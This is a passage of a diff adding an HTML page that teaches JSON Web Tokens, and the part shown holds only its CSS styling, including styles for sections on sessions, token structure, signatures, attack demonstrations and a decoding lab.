@@ -1,0 +1,2454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Decoded — Learn JSON Web Tokens</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Exo+2:wght@200;400;600;800&display=swap');
+
+  :root {
+    --bg: #060a0f;
+    --bg2: #0b1018;
+    --bg3: #111823;
+    --panel: #0d1520;
+    --border: #1a2d40;
+    --neon-green: #00ff88;
+    --neon-blue: #00c8ff;
+    --neon-red: #ff3366;
+    --neon-yellow: #ffcc00;
+    --neon-purple: #bb44ff;
+    --text: #c8dae8;
+    --text-dim: #4a6275;
+    --header-font: 'Exo 2', sans-serif;
+    --mono: 'Share Tech Mono', monospace;
+    --ui: 'Rajdhani', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--ui);
+    font-size: 16px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* SCANLINE OVERLAY */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.015) 2px, rgba(0,255,136,0.015) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    background: rgba(6,10,15,0.95);
+    border-bottom: 1px solid var(--border);
+    z-index: 1000;
+    padding: 0 2rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 56px;
+    backdrop-filter: blur(12px);
+  }
+
+  .nav-logo {
+    font-family: var(--header-font);
+    font-weight: 800;
+    font-size: 1.2rem;
+    color: var(--neon-green);
+    letter-spacing: 2px;
+    text-shadow: 0 0 20px rgba(0,255,136,0.5);
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 0.2rem;
+    list-style: none;
+  }
+
+  .nav-links a {
+    font-size: 0.75rem;
+    font-family: var(--mono);
+    color: var(--text-dim);
+    text-decoration: none;
+    padding: 0.3rem 0.6rem;
+    border-radius: 3px;
+    transition: all 0.2s;
+    letter-spacing: 1px;
+  }
+
+  .nav-links a:hover { color: var(--neon-blue); background: rgba(0,200,255,0.08); }
+
+  /* SECTIONS */
+  section {
+    min-height: 100vh;
+    padding: 100px 2rem 60px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  .section-inner {
+    max-width: 900px;
+    width: 100%;
+    margin: 0 auto;
+  }
+
+  .section-tag {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--neon-green);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    margin-bottom: 0.8rem;
+    opacity: 0.8;
+  }
+
+  h1, h2, h3 {
+    font-family: var(--header-font);
+    font-weight: 800;
+    line-height: 1.1;
+  }
+
+  h1 { font-size: clamp(2.2rem, 5vw, 4rem); }
+  h2 { font-size: clamp(1.6rem, 3vw, 2.4rem); margin-bottom: 1rem; }
+  h3 { font-size: 1.2rem; margin-bottom: 0.5rem; }
+
+  .accent-green { color: var(--neon-green); }
+  .accent-blue { color: var(--neon-blue); }
+  .accent-red { color: var(--neon-red); }
+  .accent-yellow { color: var(--neon-yellow); }
+  .accent-purple { color: var(--neon-purple); }
+
+  p { color: var(--text); font-size: 1.05rem; margin-bottom: 1rem; font-weight: 400; }
+
+  /* GLOW TEXT */
+  .glow-green { text-shadow: 0 0 30px rgba(0,255,136,0.6); }
+  .glow-blue { text-shadow: 0 0 30px rgba(0,200,255,0.6); }
+  .glow-red { text-shadow: 0 0 30px rgba(255,51,102,0.6); }
+
+  /* BUTTONS */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.7rem 1.6rem;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+    border: none;
+    text-decoration: none;
+  }
+
+  .btn-green {
+    background: rgba(0,255,136,0.1);
+    color: var(--neon-green);
+    border: 1px solid rgba(0,255,136,0.4);
+  }
+  .btn-green:hover {
+    background: rgba(0,255,136,0.2);
+    box-shadow: 0 0 20px rgba(0,255,136,0.3);
+  }
+
+  .btn-blue {
+    background: rgba(0,200,255,0.1);
+    color: var(--neon-blue);
+    border: 1px solid rgba(0,200,255,0.4);
+  }
+  .btn-blue:hover {
+    background: rgba(0,200,255,0.2);
+    box-shadow: 0 0 20px rgba(0,200,255,0.3);
+  }
+
+  .btn-red {
+    background: rgba(255,51,102,0.1);
+    color: var(--neon-red);
+    border: 1px solid rgba(255,51,102,0.4);
+  }
+  .btn-red:hover {
+    background: rgba(255,51,102,0.2);
+    box-shadow: 0 0 20px rgba(255,51,102,0.3);
+  }
+
+  .btn-yellow {
+    background: rgba(255,204,0,0.1);
+    color: var(--neon-yellow);
+    border: 1px solid rgba(255,204,0,0.4);
+  }
+  .btn-yellow:hover {
+    background: rgba(255,204,0,0.2);
+    box-shadow: 0 0 20px rgba(255,204,0,0.3);
+  }
+
+  /* CARDS / PANELS */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+  }
+
+  .panel-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: #070d14;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1.2rem;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    line-height: 1.7;
+    overflow-x: auto;
+  }
+
+  /* ===========================
+     SECTION 1: HERO
+  =========================== */
+  #intro {
+    background: radial-gradient(ellipse at 50% 30%, rgba(0,255,136,0.04) 0%, transparent 70%);
+  }
+
+  .hero-title { margin-bottom: 1.5rem; }
+  .hero-sub {
+    font-size: 1.1rem;
+    color: var(--text-dim);
+    margin-bottom: 2.5rem;
+    max-width: 560px;
+  }
+
+  /* LOGIN ANIMATION */
+  .login-anim {
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+    margin: 2rem 0;
+    padding: 1.5rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    flex-wrap: wrap;
+  }
+
+  .anim-node {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .anim-icon {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.6rem;
+    border: 2px solid;
+    transition: all 0.3s;
+  }
+
+  .anim-icon.user { border-color: var(--neon-blue); color: var(--neon-blue); background: rgba(0,200,255,0.08); }
+  .anim-icon.server { border-color: var(--neon-green); color: var(--neon-green); background: rgba(0,255,136,0.08); }
+  .anim-icon.token-icon { border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255,204,0,0.08); }
+
+  .anim-label { font-family: var(--mono); font-size: 0.75rem; color: var(--text-dim); }
+
+  .anim-arrow {
+    font-size: 1.5rem;
+    animation: arrowPulse 1.5s ease-in-out infinite;
+    color: var(--neon-green);
+  }
+
+  @keyframes arrowPulse {
+    0%, 100% { opacity: 0.3; transform: translateX(0); }
+    50% { opacity: 1; transform: translateX(4px); }
+  }
+
+  /* ===========================
+     SECTION 2: SESSION
+  =========================== */
+  #session { background: radial-gradient(ellipse at 80% 50%, rgba(255,51,102,0.03) 0%, transparent 60%); }
+
+  .session-flow {
+    display: flex;
+    flex-direction: column;
+    gap: 0.8rem;
+    margin: 1.5rem 0;
+  }
+
+  .flow-step {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    padding: 0.8rem 1rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    opacity: 0;
+    transform: translateX(-20px);
+    transition: all 0.4s ease;
+  }
+
+  .flow-step.visible {
+    opacity: 1;
+    transform: translateX(0);
+  }
+
+  .flow-step-num {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: rgba(0,200,255,0.15);
+    border: 1px solid rgba(0,200,255,0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    color: var(--neon-blue);
+    flex-shrink: 0;
+  }
+
+  .flow-step-text { font-size: 0.95rem; }
+
+  .problem-btns {
+    display: flex;
+    gap: 0.8rem;
+    flex-wrap: wrap;
+    margin: 1.5rem 0;
+  }
+
+  #problem-output {
+    min-height: 80px;
+    padding: 1rem;
+    background: var(--panel);
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    transition: all 0.4s;
+    border: 1px solid var(--border);
+  }
+
+  /* SERVER MEMORY VIZ */
+  .server-memory {
+    display: flex;
+    gap: 1rem;
+    margin: 1rem 0;
+    flex-wrap: wrap;
+  }
+
+  .server-box {
+    flex: 1;
+    min-width: 180px;
+    padding: 1rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    text-align: center;
+  }
+
+  .memory-slots {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+    margin-top: 0.8rem;
+    justify-content: center;
+  }
+
+  .memory-slot {
+    width: 20px;
+    height: 20px;
+    background: rgba(0,200,255,0.15);
+    border: 1px solid rgba(0,200,255,0.3);
+    border-radius: 2px;
+    transition: all 0.3s;
+  }
+
+  .memory-slot.used {
+    background: rgba(0,200,255,0.5);
+    box-shadow: 0 0 6px rgba(0,200,255,0.4);
+  }
+
+  .memory-slot.overload {
+    background: rgba(255,51,102,0.6);
+    box-shadow: 0 0 6px rgba(255,51,102,0.6);
+    animation: blink 0.5s infinite;
+  }
+
+  @keyframes blink {
+    50% { opacity: 0.4; }
+  }
+
+  /* ===========================
+     SECTION 3: JWT SOLUTION
+  =========================== */
+  #jwt-solution { background: radial-gradient(ellipse at 20% 50%, rgba(0,255,136,0.03) 0%, transparent 60%); }
+
+  .jwt-flow-wrap {
+    margin: 1.5rem 0;
+    overflow-x: auto;
+  }
+
+  .jwt-flow {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    min-width: 600px;
+    padding: 1.2rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+  }
+
+  .jwt-step {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.6rem;
+    border-radius: 6px;
+    background: rgba(0,255,136,0.04);
+    border: 1px solid rgba(0,255,136,0.12);
+    flex: 1;
+    min-width: 80px;
+    opacity: 0.4;
+    transition: all 0.5s;
+  }
+
+  .jwt-step.active {
+    opacity: 1;
+    background: rgba(0,255,136,0.1);
+    border-color: rgba(0,255,136,0.4);
+    box-shadow: 0 0 16px rgba(0,255,136,0.15);
+  }
+
+  .jwt-step-icon { font-size: 1.4rem; }
+  .jwt-step-label {
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    text-align: center;
+    color: var(--neon-green);
+  }
+
+  .jwt-arrow {
+    color: var(--text-dim);
+    font-size: 1.1rem;
+    flex-shrink: 0;
+  }
+
+  /* TOKEN DISPLAY */
+  .token-display {
+    display: flex;
+    gap: 0;
+    font-family: var(--mono);
+    font-size: 0.9rem;
+    margin: 1.5rem 0;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+
+  .token-part {
+    padding: 0.8rem 1rem;
+    flex: 1;
+    text-align: center;
+    transition: all 0.3s;
+    cursor: default;
+  }
+
+  .token-part.header { background: rgba(0,200,255,0.12); color: var(--neon-blue); }
+  .token-part.payload { background: rgba(255,204,0,0.12); color: var(--neon-yellow); }
+  .token-part.sig { background: rgba(0,255,136,0.12); color: var(--neon-green); }
+
+  .token-dot {
+    padding: 0.8rem 0.3rem;
+    background: var(--panel);
+    color: var(--text-dim);
+    display: flex;
+    align-items: center;
+    font-size: 1.2rem;
+  }
+
+  /* MOVING TOKEN ANIMATION */
+  .token-anim-container {
+    position: relative;
+    height: 80px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 1rem 0;
+  }
+
+  .moving-token {
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    left: -200px;
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    padding: 0.4rem 0.8rem;
+    background: rgba(0,255,136,0.15);
+    border: 1px solid rgba(0,255,136,0.4);
+    border-radius: 4px;
+    color: var(--neon-green);
+    white-space: nowrap;
+    transition: left 2s ease-in-out;
+    box-shadow: 0 0 20px rgba(0,255,136,0.3);
+  }
+
+  .moving-token.animate { left: calc(100% + 20px); }
+
+  .anim-endpoints {
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    padding: 0 1rem;
+    font-size: 0.75rem;
+    font-family: var(--mono);
+    color: var(--text-dim);
+    pointer-events: none;
+  }
+
+  /* ===========================
+     SECTION 4: COMPARISON
+  =========================== */
+  #comparison { background: var(--bg2); }
+
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+
+  .compare-card {
+    padding: 1.5rem;
+    border-radius: 8px;
+    border: 1px solid;
+  }
+
+  .compare-card.session-card {
+    background: rgba(255,51,102,0.05);
+    border-color: rgba(255,51,102,0.25);
+  }
+
+  .compare-card.jwt-card {
+    background: rgba(0,255,136,0.05);
+    border-color: rgba(0,255,136,0.25);
+  }
+
+  .compare-card h3 { margin-bottom: 1rem; }
+
+  .compare-item {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    padding: 0.5rem 0;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    font-size: 0.9rem;
+  }
+
+  .compare-item:last-child { border-bottom: none; }
+  .compare-icon { font-size: 1rem; width: 20px; text-align: center; }
+
+  /* ===========================
+     SECTION 5: JWT STRUCTURE
+  =========================== */
+  #jwt-structure { background: radial-gradient(ellipse at 50% 80%, rgba(255,204,0,0.03) 0%, transparent 60%); }
+
+  .structure-token {
+    display: flex;
+    gap: 0;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    margin: 1.5rem 0;
+    border-radius: 6px;
+    overflow: hidden;
+    cursor: pointer;
+  }
+
+  .struct-part {
+    padding: 1rem;
+    flex: 1;
+    text-align: center;
+    transition: all 0.3s;
+    position: relative;
+  }
+
+  .struct-part .struct-label {
+    display: block;
+    font-size: 0.65rem;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 0.4rem;
+    opacity: 0.7;
+  }
+
+  .struct-part .struct-val {
+    word-break: break-all;
+    font-size: 0.75rem;
+  }
+
+  .struct-part:hover { filter: brightness(1.2); }
+
+  .struct-part.hdr { background: rgba(0,200,255,0.12); color: var(--neon-blue); border: 1px solid rgba(0,200,255,0.3); }
+  .struct-part.pld { background: rgba(255,204,0,0.12); color: var(--neon-yellow); border: 1px solid rgba(255,204,0,0.3); border-left: none; border-right: none; }
+  .struct-part.sgn { background: rgba(0,255,136,0.12); color: var(--neon-green); border: 1px solid rgba(0,255,136,0.3); }
+
+  .struct-detail {
+    display: none;
+    margin-top: 1rem;
+  }
+
+  .struct-detail.active { display: block; }
+
+  .detail-panel {
+    padding: 1.2rem;
+    border-radius: 6px;
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .detail-panel.hdr { background: rgba(0,200,255,0.08); border: 1px solid rgba(0,200,255,0.2); }
+  .detail-panel.pld { background: rgba(255,204,0,0.08); border: 1px solid rgba(255,204,0,0.2); }
+  .detail-panel.sgn { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2); }
+
+  .detail-hint { font-size: 0.8rem; font-family: var(--mono); color: var(--text-dim); margin-top: 1rem; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 0.8rem; }
+
+  /* TOOLTIP */
+  .tooltip-wrap {
+    position: relative;
+    display: inline-block;
+  }
+
+  .tooltip-wrap .tooltip {
+    visibility: hidden;
+    background: #0a1525;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.5rem 0.8rem;
+    font-size: 0.8rem;
+    border-radius: 4px;
+    position: absolute;
+    z-index: 100;
+    bottom: 130%;
+    left: 50%;
+    transform: translateX(-50%);
+    white-space: nowrap;
+    opacity: 0;
+    transition: all 0.2s;
+    font-family: var(--ui);
+  }
+
+  .tooltip-wrap:hover .tooltip {
+    visibility: visible;
+    opacity: 1;
+  }
+
+  /* ===========================
+     SECTION 6: SIGNATURE
+  =========================== */
+  #signature { background: var(--bg2); }
+
+  .sig-formula {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    flex-wrap: wrap;
+    margin: 1.5rem 0;
+    padding: 1.2rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+  }
+
+  .sig-part {
+    padding: 0.6rem 1rem;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    font-weight: 600;
+  }
+
+  .sig-op {
+    font-size: 1.2rem;
+    color: var(--text-dim);
+    font-weight: 700;
+  }
+
+  .sig-equals {
+    font-size: 1.2rem;
+    color: var(--neon-green);
+    font-weight: 700;
+  }
+
+  .sig-result {
+    padding: 0.6rem 1rem;
+    border-radius: 6px;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: var(--neon-green);
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    font-weight: 600;
+    animation: glowPulse 2s ease-in-out infinite;
+  }
+
+  @keyframes glowPulse {
+    0%, 100% { box-shadow: 0 0 8px rgba(0,255,136,0.2); }
+    50% { box-shadow: 0 0 20px rgba(0,255,136,0.5); }
+  }
+
+  .sig-anim-btn { margin-bottom: 1rem; }
+
+  /* ===========================
+     SECTION 7: ATTACKS
+  =========================== */
+  #attacks { background: radial-gradient(ellipse at 50% 30%, rgba(255,51,102,0.05) 0%, transparent 60%); }
+
+  .attack-tabs {
+    display: flex;
+    gap: 0.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+
+  .attack-tab {
+    padding: 0.5rem 1rem;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    letter-spacing: 1px;
+    border-radius: 4px;
+    cursor: pointer;
+    border: 1px solid rgba(255,51,102,0.25);
+    background: rgba(255,51,102,0.05);
+    color: var(--text-dim);
+    transition: all 0.2s;
+  }
+
+  .attack-tab.active, .attack-tab:hover {
+    background: rgba(255,51,102,0.15);
+    border-color: rgba(255,51,102,0.5);
+    color: var(--neon-red);
+  }
+
+  .attack-panel { display: none; }
+  .attack-panel.active { display: block; }
+
+  /* TAMPER */
+  .tamper-token {
+    display: flex;
+    gap: 0;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    margin: 1rem 0;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .tamper-part {
+    padding: 0.8rem 1rem;
+    flex: 1;
+    text-align: center;
+  }
+
+  .tamper-part.hdr { background: rgba(0,200,255,0.12); color: var(--neon-blue); }
+  .tamper-part.pld { background: rgba(255,204,0,0.12); color: var(--neon-yellow); }
+  .tamper-part.sig-ok { background: rgba(0,255,136,0.12); color: var(--neon-green); transition: all 0.5s; }
+  .tamper-part.sig-bad { background: rgba(255,51,102,0.2); color: var(--neon-red); animation: shake 0.4s; }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    60% { transform: translateX(6px); }
+    80% { transform: translateX(-4px); }
+  }
+
+  .role-selector {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin: 1rem 0;
+    padding: 1rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+  }
+
+  .role-select {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.4rem 0.8rem;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    cursor: pointer;
+  }
+
+  .tamper-result {
+    padding: 1rem;
+    border-radius: 6px;
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 1rem;
+    margin-top: 1rem;
+    transition: all 0.4s;
+    display: none;
+  }
+
+  .tamper-result.show { display: block; animation: fadeIn 0.4s ease; }
+  .tamper-result.denied { background: rgba(255,51,102,0.1); border: 1px solid rgba(255,51,102,0.3); color: var(--neon-red); }
+  .tamper-result.granted { background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.3); color: var(--neon-green); }
+
+  /* XSS */
+  .xss-scene {
+    display: flex;
+    flex-direction: column;
+    gap: 0.8rem;
+    margin: 1rem 0;
+  }
+
+  .xss-step {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    padding: 0.8rem 1rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    opacity: 0.3;
+    transition: all 0.5s;
+  }
+
+  .xss-step.lit { opacity: 1; border-color: rgba(255,51,102,0.4); background: rgba(255,51,102,0.05); }
+  .xss-step-icon { font-size: 1.2rem; width: 30px; text-align: center; }
+
+  /* BRUTE FORCE */
+  .bf-log {
+    background: #050a10;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1rem;
+    height: 160px;
+    overflow-y: auto;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    line-height: 1.8;
+    margin: 1rem 0;
+  }
+
+  .bf-log .log-line { color: var(--text-dim); }
+  .bf-log .log-found { color: var(--neon-green); font-weight: bold; }
+  .bf-log .log-trying { color: var(--neon-blue); }
+
+  .bf-progress {
+    height: 6px;
+    background: var(--border);
+    border-radius: 3px;
+    margin: 0.8rem 0;
+    overflow: hidden;
+  }
+
+  .bf-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--neon-red), var(--neon-yellow));
+    width: 0%;
+    transition: width 0.1s;
+    border-radius: 3px;
+  }
+
+  /* ===========================
+     SECTION 8: LIFECYCLE
+  =========================== */
+  #lifecycle { background: var(--bg2); }
+
+  .lifecycle-track {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin: 1.5rem 0;
+    overflow-x: auto;
+  }
+
+  .lc-step {
+    flex: 1;
+    min-width: 100px;
+    text-align: center;
+    padding: 1rem 0.5rem;
+    position: relative;
+  }
+
+  .lc-step::after {
+    content: '';
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 0;
+    height: 0;
+    border-style: solid;
+    border-width: 10px 0 10px 12px;
+    border-color: transparent transparent transparent var(--border);
+  }
+
+  .lc-step:last-child::after { display: none; }
+
+  .lc-icon {
+    font-size: 1.8rem;
+    margin-bottom: 0.4rem;
+  }
+
+  .lc-label {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+
+  .lc-step.active .lc-label { color: var(--neon-green); }
+  .lc-step.active .lc-icon { filter: drop-shadow(0 0 8px rgba(0,255,136,0.8)); }
+
+  /* TIMER */
+  .expiry-timer {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    padding: 1.2rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-top: 1rem;
+    flex-wrap: wrap;
+  }
+
+  .timer-display {
+    font-family: var(--mono);
+    font-size: 2.5rem;
+    color: var(--neon-green);
+    letter-spacing: 4px;
+    transition: color 0.5s;
+  }
+
+  .timer-display.warn { color: var(--neon-yellow); }
+  .timer-display.danger { color: var(--neon-red); animation: blink 0.5s infinite; }
+
+  .timer-label { font-size: 0.8rem; color: var(--text-dim); font-family: var(--mono); }
+
+  .timer-bar { flex: 1; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; min-width: 100px; }
+  .timer-fill { height: 100%; background: var(--neon-green); transition: width 1s linear, background 0.5s; border-radius: 3px; }
+  .timer-fill.warn { background: var(--neon-yellow); }
+  .timer-fill.danger { background: var(--neon-red); }
+
+  /* ===========================
+     SECTION 9: API REQUEST
+  =========================== */
+  #api-request { background: radial-gradient(ellipse at 50% 50%, rgba(0,200,255,0.03) 0%, transparent 60%); }
+
+  .http-box {
+    background: #050a10;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 1.5rem 0;
+  }
+
+  .http-bar {
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    padding: 0.6rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+  }
+
+  .http-method {
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    padding: 0.2rem 0.6rem;
+    background: rgba(0,200,255,0.15);
+    border: 1px solid rgba(0,200,255,0.3);
+    color: var(--neon-blue);
+    border-radius: 3px;
+  }
+
+  .http-url {
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    color: var(--text);
+  }
+
+  .http-body {
+    padding: 1.2rem;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    line-height: 2;
+  }
+
+  .http-key { color: var(--text-dim); }
+  .http-val { color: var(--neon-green); }
+  .http-token-val {
+    color: var(--neon-yellow);
+    word-break: break-all;
+    font-size: 0.75rem;
+  }
+
+  .request-anim-btn { margin-bottom: 1rem; }
+
+  .request-status {
+    padding: 0.8rem 1rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 0.85rem;
+    display: none;
+  }
+
+  .request-status.show { display: block; animation: fadeIn 0.4s ease; }
+
+  /* ===========================
+     SECTION 10: ADVANCED
+  =========================== */
+  #advanced { background: var(--bg2); }
+
+  .algo-compare {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+    margin: 1.5rem 0;
+  }
+
+  .algo-card {
+    padding: 1.5rem;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+  }
+
+  .algo-card.hs { background: rgba(0,200,255,0.05); border-color: rgba(0,200,255,0.25); }
+  .algo-card.rs { background: rgba(187,68,255,0.05); border-color: rgba(187,68,255,0.25); }
+
+  .key-visual {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    margin: 1rem 0;
+    font-size: 1.5rem;
+  }
+
+  .algo-tag {
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    letter-spacing: 1px;
+    margin-top: 0.5rem;
+  }
+
+  .tag-sym { background: rgba(0,200,255,0.1); color: var(--neon-blue); }
+  .tag-asym { background: rgba(187,68,255,0.1); color: var(--neon-purple); }
+
+  .algo-list {
+    list-style: none;
+    margin-top: 1rem;
+  }
+
+  .algo-list li {
+    padding: 0.3rem 0;
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    display: flex;
+    gap: 0.5rem;
+    align-items: center;
+  }
+
+  .algo-list li::before { content: '›'; font-size: 1.2rem; }
+
+  /* ===========================
+     SECTION 11: LAB
+  =========================== */
+  #lab { background: radial-gradient(ellipse at 50% 50%, rgba(0,255,136,0.04) 0%, transparent 60%); }
+
+  .lab-input {
+    width: 100%;
+    background: #050a10;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.8rem 1rem;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    resize: vertical;
+    min-height: 80px;
+    margin: 1rem 0;
+    transition: border-color 0.2s;
+  }
+
+  .lab-input:focus {
+    outline: none;
+    border-color: rgba(0,255,136,0.4);
+  }
+
+  .lab-btns {
+    display: flex;
+    gap: 0.8rem;
+    flex-wrap: wrap;
+    margin-bottom: 1rem;
+  }
+
+  .lab-output {
+    background: #050a10;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.2rem;
+    font-family: var(--mono);
+    font-size: 0.82rem;
+    min-height: 100px;
+    line-height: 1.8;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .lab-section-title {
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .lab-output .key { color: var(--neon-blue); }
+  .lab-output .val { color: var(--neon-yellow); }
+  .lab-output .ok { color: var(--neon-green); }
+  .lab-output .err { color: var(--neon-red); }
+
+  /* MODIFY PAYLOAD LAB */
+  .payload-editor {
+    width: 100%;
+    background: #050a10;
+    border: 1px solid rgba(255,204,0,0.3);
+    color: var(--neon-yellow);
+    padding: 0.8rem 1rem;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 0.82rem;
+    resize: vertical;
+    min-height: 120px;
+    margin: 1rem 0;
+  }
+
+  .payload-editor:focus { outline: none; border-color: rgba(255,204,0,0.6); }
+
+  /* ===========================
+     DIVIDERS
+  =========================== */
+  .section-divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 0;
+  }
+
+  /* WARNING BOX */
+  .warning-box {
+    background: rgba(255,51,102,0.06);
+    border: 1px solid rgba(255,51,102,0.3);
+    border-radius: 6px;
+    padding: 1rem 1.2rem;
+    margin: 1rem 0;
+    font-size: 0.9rem;
+    display: flex;
+    gap: 0.8rem;
+    align-items: flex-start;
+  }
+
+  .warning-icon { font-size: 1.2rem; flex-shrink: 0; }
+
+  .info-box {
+    background: rgba(0,200,255,0.06);
+    border: 1px solid rgba(0,200,255,0.25);
+    border-radius: 6px;
